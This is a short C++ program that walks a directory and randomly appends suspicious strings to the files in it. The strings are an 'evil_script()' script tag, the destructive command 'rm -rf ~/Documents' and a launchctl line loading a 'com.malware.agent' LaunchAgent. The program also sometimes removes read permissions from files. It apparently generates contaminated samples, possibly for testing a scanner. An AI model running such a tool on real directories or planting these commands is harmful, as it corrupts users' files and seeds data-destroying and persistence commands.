#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>

const std::string jsSus = "<script>evil_script()</script>";
const std::string unixSus = "rm -rf ~/Documents";
const std::string macOSSus = "system(\"launchctl load /Library/LaunchAgents/com.malware.agent\")";

size_t contaminateFile(const std::string& path)
{
    std::ofstream fout(path, std::ios::app | std::ios::out);

    if(path.find(".js") != std::string::npos && rand() % 2 == 0)
    {
        fout << jsSus << std::endl;
        return 1;
    }
    else
    {
        if(rand() % 3 == 0)
        {
            fout << unixSus << std::endl;
            return 2;
        }
        else if(rand() % 5 == 0)
        {
            fout << macOSSus << std::endl;
            return 3;
        }
        else if(rand() % 20 == 0)
        {
            fout.close();

            std::filesystem::permissions(
                path,
                std::filesystem::perms::group_read | std::filesystem::perms::owner_read  | std::filesystem::perms::others_read,
                std::filesystem::perm_options::remove);

            return 4;
        }
    }

    return 0;
}

int main(int argc, char** argv)
{
    if(argc != 2)
    {
        std::cout << "Not enough params!" << std::endl;
        return 1;
    }
    
    try
    {
        size_t js = 0;
        size_t un = 0;
        size_t mac = 0;
        size_t blocked = 0;

        std::filesystem::path path(argv[1]);

        for (const auto& file : std::filesystem::directory_iterator(path))
        {
            size_t res = contaminateFile(file.path());

            switch(res)
            {
                case 1: js++; break;
                case 2: un++; break;
                case 3: mac++; break;
                case 4: blocked++; break;
            }
        }

        std::cout << "Js:     " << js << std::endl;
        std::cout << "Unix:   " << un << std::endl;
        std::cout << "MacOS:  " << mac << std::endl;
        std::cout << "Blcoked:  " << blocked << std::endl;
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }
}